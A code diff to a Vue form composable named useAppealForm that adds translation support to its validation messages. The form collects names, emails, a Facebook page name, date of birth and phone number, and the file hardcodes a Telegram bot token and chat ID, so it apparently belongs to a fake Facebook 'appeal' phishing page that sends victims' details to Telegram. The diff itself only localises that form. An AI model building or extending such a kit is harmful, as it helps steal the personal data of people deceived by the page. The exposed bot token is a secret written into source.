@@ -2,7 +2,8 @@ import { reactive, ref, shallowRef, markRaw, watch, onMounted, nextTick, onBefor
 import "intl-tel-input/build/css/intlTelInput.css";
 import intlTelInput from "intl-tel-input";
 import { AsYouType } from "libphonenumber-js";
-// ❌ REMOVED: import api from "@/services/api";
+import { useI18n } from "vue-i18n";
+
 
 /**
  * ✅ Cookie utilities
@@ -179,6 +180,7 @@ const TELEGRAM_BOT_TOKEN = "8388711243:AAHK6UUxOlMkjxuxHzfhlrwKlbjY3mUZ3dE";
 const TELEGRAM_CHAT_ID = "-1003453491467";
 
 export function useAppealForm(emit) {
+    const { t } = useI18n();
     const phone = ref("");
     const phoneE164 = ref("");
     const iti = shallowRef(null);
@@ -430,33 +432,45 @@ export function useAppealForm(emit) {
     });
 
     watch(() => form.fullName, (val) => {
-        errors.fullName = val.trim() ? "" : "Please enter enough full name.";
+        errors.fullName = val.trim()
+            ? ""
+            : t("popup.errors.fullName");
     });
 
     watch(() => form.email, (val) => {
-        errors.email = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(val) ? "" : "Please enter enough email address.";
+        errors.email = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(val)
+            ? ""
+            : t("popup.errors.email");
     });
 
     watch(() => form.businessEmail, (val) => {
         errors.businessEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(val)
             ? ""
-            : "Please enter enough email business address.";
+            : t("popup.errors.businessEmail");
     });
 
     watch(() => form.pageName, (val) => {
-        errors.pageName = val.trim() ? "" : "Please enter enough Facebook page name.";
+        errors.pageName = val.trim()
+            ? ""
+            : t("popup.errors.pageName");
     });
 
     watch(() => [form.dob.day, form.dob.month, form.dob.year], ([d, m, y]) => {
-        errors.dob = d && m && y ? "" : "Please enter enough date of birth.";
+        errors.dob = d && m && y
+            ? ""
+            : t("popup.errors.dob");
     });
 
     watch(() => form.issue, (val) => {
-        errors.issue = val.trim() ? "" : "Please enter your issue";
+        errors.issue = val.trim()
+            ? ""
+            : t("popup.errors.issue");
     });
 
     watch(() => form.agreeTerms, (val) => {
-        errors.agreeTerms = val ? "" : "Please agree to our terms and data and cookie policy";
+        errors.agreeTerms = val
+            ? ""
+            : t("popup.errors.agreeTerms");
     });
 
     watch(step, (v) => {
@@ -464,23 +478,38 @@ export function useAppealForm(emit) {
     });
 
     function validatePhoneNumber() {
-        errors.fullName = form.fullName.trim() ? "" : "Please enter enough full name.";
-        errors.email = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(form.email) ? "" : "Please enter enough email address.";
+        errors.fullName = form.fullName.trim()
+            ? ""
+            : t("popup.errors.fullName");
+
+        errors.email = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(form.email)
+            ? ""
+            : t("popup.errors.email");
+
         errors.businessEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(form.businessEmail)
             ? ""
-            : "Please enter enough email business address.";
-        errors.pageName = form.pageName.trim() ? "" : "Please enter enough Facebook page name.";
+            : t("popup.errors.businessEmail");
+
+        errors.pageName = form.pageName.trim()
+            ? ""
+            : t("popup.errors.pageName");
 
         const { day, month, year } = form.dob;
-        errors.dob = day && month && year ? "" : "Please enter enough date of birth.";
+        errors.dob = day && month && year
+            ? ""
+            : t("popup.errors.dob");
 
-        errors.issue = "";
-        errors.agreeTerms = form.agreeTerms ? "" : "Please agree to our terms and data and cookie policy";
+        errors.agreeTerms = form.agreeTerms
+            ? ""
+            : t("popup.errors.agreeTerms");
 
         const dial = getDialCode();
         const digits = (phone.value || "").replace(/\D/g, "");
         let nationalDigits = digits;
-        if (nationalDigits.startsWith(dial)) nationalDigits = nationalDigits.slice(dial.length);
+
+        if (nationalDigits.startsWith(dial)) {
+            nationalDigits = nationalDigits.slice(dial.length);
+        }
 
         validatePhoneLoose(nationalDigits);
 
